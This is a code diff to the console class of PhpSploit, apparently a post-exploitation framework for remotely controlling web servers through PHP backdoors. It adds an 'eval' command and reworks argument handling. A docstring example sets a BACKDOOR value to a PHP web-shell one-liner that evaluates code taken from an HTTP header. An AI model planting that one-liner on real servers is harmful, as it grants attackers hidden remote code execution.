@@ -32,10 +32,17 @@ class CoreShell(cmdlib.Cmd):
         return(commands)
 
 
-    def run(self, line):
+    def run(self, data):
         """this function runs the line specified as argument
         """
-        return self.onecmd(line)
+        commands = self.parse_input(data)
+        stop = None
+        while commands and not stop:
+            cmd = commands.pop(0)
+            cmd = self.precmd(cmd)
+            stop = self.onecmd(cmd)
+            stop = self.postcmd(stop, cmd)
+        return stop
 
 
     #####################
@@ -184,6 +191,36 @@ class CoreShell(cmdlib.Cmd):
 
 
     ####################
+    ### COMMAND: eval ##
+    def do_eval(self, cmd):
+        """Execute the given strings/files as phpsploit commands
+
+        Usage:   eval `[commands]`
+                 eval `[file]`
+
+        Example: eval `clear; reload; lcd '/tmp'`
+                 eval `~/phpsploit-handler.txt`
+                 eval /tmp/commands.lst
+        """
+        if cmd['argc'] < 2:
+            data = 'help eval'
+        else:
+            for i in range(1,cmd['argc']):
+                f = getpath(cmd['argv'][i])
+                if f.isfile():
+                    try: cmd['argv'][i] = f.read()
+                    except EnvironmentError, e:
+                        print P_err+"Eval error: '%s': %s"\
+                                    %(e.filename,e.strerror)
+                        return
+                    except BaseException, e:
+                        print P_err+"Eval error: %r" %(e)
+                        return
+            data = '\n'.join(cmd['argv'][1:])
+        return self.run(data)
+
+
+    ####################
     ### COMMAND: set ###
     def complete_set(self, text, *ignored):
         keys = self.CNF['SET'].keys()
@@ -194,16 +231,17 @@ class CoreShell(cmdlib.Cmd):
 
         Usage:   set
                  set [variable]
-                 set [variable] [value]
+                 set [variable] `[value]`
 
-        Example: set TEXTEDITOR /usr/bin/nano
+        Example: set TEXTEDITOR `/usr/bin/nano`
+                 set BACKDOOR `<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>`
                  set PROXY None
         """
         def show(*elem):
             tpl = '%s ==> '+color(1)+'%s'+color(0)
             print tpl % elem
 
-        def set_var(var):
+        def set_var(var, val):
             backup = self.CNF['SET'][var]
             self.CNF['SET'][var] = val
             from usr.settings import comply
@@ -233,18 +271,23 @@ class CoreShell(cmdlib.Cmd):
             patern = cmd['argv'][1].upper() if cmd['argc'] > 1 else ''
             title = "Session settings"
             items = self.CNF['SET'].items()
-            elems = dict([(x.upper(),y) for x,y in items if x.upper().startswith(patern)])
-            columnize_vars(title, elems).write()
+            elems = [(x.upper(),y) for x,y in items if x.startswith(patern)]
+            if elems:
+                columnize_vars(title, dict(elems)).write()
+            else:
+                self.run('help set')
         else:
             var = cmd['argv'][1].upper()
-            val = cmd['args'][cmd['args'].find(' ')+1:].strip()
             if var in self.CNF['SET']:
                 if var in self.locked_settings:
                     print P_err+'Locked session setting: '+var
                 else:
-                    set_var(var)
+                    val = ' '.join(cmd['argv'][2:]).strip()
+                    set_var(var, val)
             else:
                 self.run('help set')
+
+
 
     #####################
     ### COMMAND: help ###
@@ -257,6 +300,7 @@ class CoreShell(cmdlib.Cmd):
         """
         if cmd['argc'] > 2:
             self.run('help help')
+            return
 
         sys_commands = self.get_commands(self)
 
@@ -308,19 +352,17 @@ class CoreShell(cmdlib.Cmd):
         core_commands  = self.get_commands(CoreShell)
         shell_commands = [x for x in sys_commands if x not in core_commands]
 
-
         help = [('Core Commands',core_commands),
                 ('Shell Commands',shell_commands)]
-        #try:
+
         if self.shell_name == 'remote':
             # try to load plugin groups
             for category in self.plugins.categories():
-                name   = 'Pspapi: %s Commands' \
+                name   = 'Plugins: %s Commands' \
                          % category.replace('_',' ').capitalize()
                 items  = self.plugins.list_category(category)
                 maxlen = max(maxlen, len(max(items, key=len)))
                 help+=[(name, items)]
-        #except: pass
 
         for group, commands in help:
             # loop to print help categories
